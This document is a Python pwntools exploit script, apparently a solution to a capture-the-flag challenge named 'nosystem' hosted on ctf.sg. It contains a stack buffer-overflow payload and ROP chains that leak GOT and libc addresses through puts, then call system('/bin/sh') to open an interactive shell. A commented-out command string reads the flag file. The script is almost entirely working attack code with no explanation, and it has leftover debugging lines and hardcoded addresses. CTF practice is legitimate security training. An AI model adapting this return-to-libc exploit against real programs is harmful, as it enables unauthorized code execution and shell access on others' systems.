from pwn import *

HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30401

io = process("./Given/nosystem")
libc = io.libc # libc=ELF('/path/to/libc')
io.close()


### Addresses & Offsets ####################################################
base_libc = 0x00007f75d6b9e000
bin_sh = next(libc.search(b'/bin/sh'))
bin_sh_offset = 0x18c966
#bin_sh_offset = next(libc.search(b"/bin/sh"))
system_offset = 0x000000000004a120 #libc.symbols["system"]
puts_offset = 0x0000000000076cd0
system = 0x7ffff7e21120

pop_rdi = 0x0000000000400823
pop_rsi_r15 = 0x0000000000400821
puts = 0x000000000400560
printf = 0x0000000000400570
main = 0x00000000004006ef
## Strings
enter_username = 0x400af4
greetings = 0x400b07

### Payload ###########################################################
padding = b"A"*(256) + p64(0x0000000000400541) # ret# ebp value

def pop_rdi_ropchain(rdi):
    ropchain = b''
    ropchain += p64(pop_rdi)
    ropchain += p64(rdi)
    return ropchain
def puts_ropchain(rdi):
    ropchain = b''
    ropchain += pop_rdi_ropchain(rdi)
    ropchain += p64(puts)
    return ropchain

def printf_ropchain(rdi,rsi=0):
    ropchain = b''
    ropchain += pop_rdi_ropchain(rdi)
    ropchain += p64(pop_rsi_r15)
    ropchain += p64(rsi)
    ropchain += p64(0) # random value for r15
    ropchain += p64(printf)
    return ropchain

def get_shell(bin_sh, system):
    ropchain = b''
    ropchain += p64(0x0000000000400541) # ret
    ropchain += pop_rdi_ropchain(bin_sh)
    ropchain += p64(system)
    return ropchain

ropchain = b''

ropchain += p64(0x0000000000400541) # ret
ropchain += puts_ropchain(0x601008) # leak the global offset table
ropchain += puts_ropchain(0x601018) # leak puts
ropchain += puts_ropchain(0x601040) # leak scanf
ropchain += p64(0x0000000000400541) # ret
ropchain += p64(main)


print(ropchain)
commands = b""
commands += b"\necho\nwhoami\ncat /home/nosystem/flag.txt\n"


payload = padding + get_shell(0x7ffff7e4dcd0-0x0000000000076cd0+0x18c966, 0x7ffff7e21120+4) + b"\n" #+commands
with open("/tmp/t", "wb") as f:f.write(payload)


### Remote Connection and Sending of Payloads ######################################################################################
#io = remote(HOST, PORT)
io = process("./Given/nosystem")
#io.recvuntil("=>")

def getAddress():
    data = io.recvuntil('\n')
    value = unpack(data.replace(b"\n",b""),'all', endian='little', sign=False) # Using pwntools
    return data, value

def run(payload):
    io.send(payload)
    return io.recvuntil("Greetings AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x05@!")

def leak_ropchain(address):
    ropchain = b''
    ropchain += p64(0x0000000000400541) # ret
    ropchain += puts_ropchain(address)
    ropchain += p64(0x0000000000400541) # ret
    ropchain += p64(main) # ret
    return ropchain
def leak(address):
    payload = padding + leak_ropchain(address) + b"\n" #+commands
    run(payload)
    binary, data = getAddress()
    return data

libc_puts = leak(0x601018) # leak puts
libc_base = libc_puts - puts_offset
libc_bin_sh = libc_base+bin_sh_offset
libc_system = libc_base+system_offset
if hex(libc_system)[-2:] == "20": libc_system+=4

print(hex(libc_puts), hex(libc_system))
def hexStringToString(hexString):
    return bytes.fromhex(hexString[2:]).decode('utf-8')[::-1]
print( hexStringToString(hex(leak(libc_bin_sh))))


#d = leak(libc_system)
#print( disasm(bytes.fromhex(hex(d)[2:])) )
print(io.leak(libc_bin_sh, 4))

#d = DynELF(leak)
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

payload = padding + pop_rdi_ropchain(libc_bin_sh) + p64(main)
with open("/tmp/tt", "wb") as f:f.write(payload)
print(run(payload))

run(get_shell(libc_bin_sh, 	libc_puts-0x071cd0+0x045830))# + commands
print(io.recv())
io.interactive()
